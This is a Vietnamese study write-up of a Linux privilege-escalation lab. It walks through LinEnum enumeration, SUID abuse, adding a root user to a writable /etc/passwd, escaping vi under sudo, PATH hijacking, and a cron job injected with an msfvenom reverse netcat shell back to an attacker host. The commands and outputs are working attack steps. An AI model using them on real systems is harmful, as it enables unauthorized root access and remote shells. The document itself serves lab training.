<h2>Understanding Pricesc</h2>

✔

<h2>Direction of Privilege Escalation</h2>

Priviledge Tree\
![image](https://user-images.githubusercontent.com/95600382/150273599-6221d23c-7e2d-4b20-85d1-1336ce0443ea.png)\
Có 2 loại leo thang đặc quyền:\
- Horizontal privilege escalation: Leo thang theo chiều ngang, chiếm quyền của các user ngang hàng
- Vertical privilege escalation: Leo thang theo chiều dọc, chiếm quyền hoặc nâng quyền từ user đang có.

<h2>Enumeration</h2>

LinEnum là một bash script đơn giản chứa các command sử dụng trong leo thang đặc quyền. 
links: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
Cách có thể để chuyển LinEnum đến máy mục tiêu\
2 cách:\
Cách 1 host 1 server với python và down trực tiếp về máy mục tiêu bằng cách sử dụng `wget` sau đó phân quyền với `chmod +x` và thực thi script.\
![image](https://user-images.githubusercontent.com/95600382/150454966-105167bd-fecf-42a7-8a6b-b33c70094815.png)\
Cách 2 áp dụng khi b có một quyền hợp lý trên máy nạn nhân, copy code của linenum và thực thi nó trên máy nạn nhân.\
Output của LinEnum sẽ được chia ra thành nhiều phần, và các phần chính chúng ta nên tập trung vào là:\
Kernel: Bao gồm các thông tin về kernel và các lỗ hổng kernel có trên máy mục tiêu/
Can we read/write sensitive files: Các file được quyền đọc ghi 
SUID Files: SUID là một loại quyền đặc biệt đc tra cho file. Nó cho phép file được chạy với quyền của chủ sở hữu\
Crontab ContentS: Thông tin về Cron jobs.
VD: đăng nhập ssh vào máy mục tiêu với user3:password\
Target hostname:`polobox`\
![image](https://user-images.githubusercontent.com/95600382/150293666-32f50534-6865-40f6-b112-4aecf6c3e9ad.png)\
Chạy LinEnum:\
![image](https://user-images.githubusercontent.com/95600382/150455799-074a0bae-8d38-4993-bc43-2a8ae75ea9f5.png)\

<h2>Abusing SUID/GUID Files</h2>

**Tìm và khai thác các SUID Files**\
Chúng ta có thể tận dụng các file này để lấy shell có quyền cao hơn.\
**SUID Binary**\
Trong Linux mọi thứ đều là file với 3 quyền chính là read/write/execute. Vậy nên cần chú ý đến các user và có hoặc bị hạn chế 3 quyền này. Cơ chế phân quyền trong Linux:\
user-group-others\
rwx-rwx-rwx\
421-421-421\
Quyền max có thể set cho user là 7 (4+2+1). vd 755 là rwxr-xr-x\
Các quyền đặc biệt khi được gán cho user sẽ trở thành SUID hoặc SGID. vd bit 4 được gán cho user (Owner) sẽ trở thành SUID và bit 2 gán cho gr sẽ trở thành SGID\
Quyền SUID:\
SUID: rws-rwx-rwx\
GUID: rwx-rws-rwx\
**Tìm SUID Binary**\
LinEnum sẽ giúp b tìm các file này. hoặc b có thể tự tìm với lệnh `find / -perm -u=s -type f 2>/dev/null`
Thực thi thử file SUID shell:\
![image](https://user-images.githubusercontent.com/95600382/150458750-dce6745c-aec1-4875-8e99-48988c13e6ed.png)\
Có thể thấy quyền user đã chuyển từ user3 lên root\
![image](https://user-images.githubusercontent.com/95600382/150459057-a87a62bb-1873-4880-8a2a-453128dee45e.png)\

<h2>Exploiting Writeable /etc/passwd</h2>
  
Trong máy mục tiêu, ta tìm ra rằng user 7 nằm trong gr root do gid 0\
![image](https://user-images.githubusercontent.com/95600382/150459473-50467595-ca00-4728-b23e-a5b0170f897c.png)\
Cấu trúc file /etc/passwd/\
test:x:0:0:root:/root:/bin/bash:
username\
password: x thể hiện cho pass mã hóa đc lưu trong /etc/passwd\
userID\
groupID\
user ID info: extra info về user\
Home directory: thư mục gốc của user khi login\
Command/shell\
**Cách để khai thác một file /etc/passwd**\
Tạo thêm một user với format tương ứng với pass, uid, gid,... tùy chọn.\
VD:\
Tạo ra một password hash:
```
openssl passwd -1 -salt [salt] [password]
```
![image](https://user-images.githubusercontent.com/95600382/150460187-281471af-716c-40e4-aab8-c500858abffb.png)\
Tạo một user new có quyền root với pass hash vừa tạo:
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```
![image](https://user-images.githubusercontent.com/95600382/150461024-d1661232-8de9-4f22-b93a-14d83c999697.png)\

<h2>Escaping Vi Editor</h2>

```
sudo -l
```
Các lệnh có thể sử dụng với sudo.\
**Escaping Vi**\
![image](https://user-images.githubusercontent.com/95600382/150459473-50467595-ca00-4728-b23e-a5b0170f897c.png)\
Chạy lệnh `sudo -l` trên user8 có thể thấy được user này có thể chạy vi với quyền root\
![image](https://user-images.githubusercontent.com/95600382/150461581-9a155f4e-9c91-4b54-8f6e-144d70715dc0.png)\
Có thể sử dụng GTFOBins: https://gtfobins.github.io/ để bypass các security missconfig\
leo thang với vi: sudo vi > :!sh > Kết quả:\
![image](https://user-images.githubusercontent.com/95600382/150462111-14e6827a-8ef4-43e8-8ddf-5bf30fa8da7c.png)\

<h2>Exploiting Crontab</h2>

View cronjobs: `cat /etc/crontab`\
Format của Cronjob:\
# = id\
m = phút\
h = giờ\
dom = Day of the Month\
mon = Month\
dow = day of the week\
user = user nào chạy command\
command = command sẽ đc chạy\
vd:
```
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```
**How to khai thác ?**\
Trong ví dụ, ta có thể thấy file autoscript.sh trên user4 desktop đc chạy 5ph một lần với quyền root, và chúng ta có quyền write với file này. Tạo một command với msfvenom rồi chèn vào file script để chạy.
```
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
![image](https://user-images.githubusercontent.com/95600382/150463243-b71c059d-7912-4b2e-aa7d-cbcc5d6b8fa7.png)\
Đợi tầm 5ph ta có thể thấy kết nối với quyền root đã đc khởi tạo thành công:\
![image](https://user-images.githubusercontent.com/95600382/150464128-7a544904-da17-4d48-96f3-82a1df58532b.png)\

<h2>Exploiting PATH Variable</h2>

PATH là một biến môi trường trong Linux và Unix sử dụng để chỉ định thư mục chứa các chương trình có thể thực thi.\
view path: `echo $PATH$\`
>How does this let us escalate privileges?

Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!\

VD: Ở đây ta có một file ELF script chạy ls\
![image](https://user-images.githubusercontent.com/95600382/150497307-e1a3155b-3bfc-4820-8532-8678e8a97fca.png)\
Giờ chúng ta sẽ đổi thư mục sang `tmp` và tạo một file thực thi với 1 lệnh bất kỳ:\
echo “[whatever command we want to run]” > [name of the executable we’re imitating]\
What would the command look like to open a bash shell, writing to a file with the name of the executable we’re imitating\
`echo "/bin/bash" > ls`\
![image](https://user-images.githubusercontent.com/95600382/150498303-dedbf0f1-4dbb-4e24-88be-6004429b32b1.png)\
Sau khi phân quyền cho file chạy, giờ chúng ta phải thay đổi giá trị của biến PATH, ở đây là file nơi script `ls` được lưu trữ. Sử dụng lệnh sau:
```
export PATH=/tmp:$PATH
```
Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.\
Tiếp đó quay lại màn hình và thực hiện chạy ./scriptm kết quả script đã khởi chạy thành công và nâng quyền lên root:\
![image](https://user-images.githubusercontent.com/95600382/150499472-30d17488-6d30-488b-b308-348a7d170641.png)\
Sử dụng về lại mặc định:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```
để reset biến PATH


